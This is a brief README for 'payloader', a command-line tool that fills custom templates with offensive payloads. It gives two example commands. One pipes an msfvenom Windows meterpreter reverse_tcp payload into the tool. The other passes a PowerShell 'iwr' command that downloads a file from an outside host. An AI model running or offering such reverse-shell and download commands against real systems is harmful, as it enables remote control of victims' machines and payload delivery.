# payloader

Generate payloads using a a simple cli interface for faster access to custom payloads.

payloader allow you to automate a whole lot of copy paste work to speed up that workflow inthe shell.

Inputs are substituted into custom templates and automate builds where possible. 

## Features

- Lightweight
- Cusom templates
- Payloads can be piped in and directly set.

Eg.

```
msfvenon -p windows/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.10 -f ps1 | payloader example.ps1 -f ps1 -o test
```

or

```bash
payloader example.ps1 -f ps1 -o test -p "iwr http://test.com/test -o test"
```
